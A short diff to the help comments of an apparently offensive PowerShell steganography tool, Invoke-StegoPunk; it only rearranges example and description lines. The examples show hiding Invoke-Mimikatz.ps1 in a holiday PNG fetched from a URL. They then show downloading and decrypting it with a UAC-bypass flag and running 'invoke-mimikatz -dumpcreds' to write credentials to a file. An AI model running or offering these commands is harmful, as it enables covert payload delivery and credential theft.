@@ -6,14 +6,14 @@ License: GNU GPL v2
 Version: v1.0
 
 .Example
-
-Create PNG Repo File
 invoke-stegopunk -mode encryption -key 'Passo' -fileurl 'https:// ... download from ... /Example/Invoke-Mimikatz.ps1' -imageurl 'http://... download... image/wp-content/polignano_puglia_italy.png' -imagename 'vacanze.png'
+.Description
+Create PNG Repo File in %userprofile%\desktop\
 
 .Example
-Decrypting/Execution from PNG Repo
 invoke-stegopunk -mode decryption -key 'Passo' -b_uac on -imageurl 'https://example.blog....com/vacanze.png' -command 'invoke-mimikatz -dumpcreds > c:\users\v.delaurentis\desktop\vito.txt'
-
+.Description
+Decrypting/Execution from PNG Repo
 
 #>
 
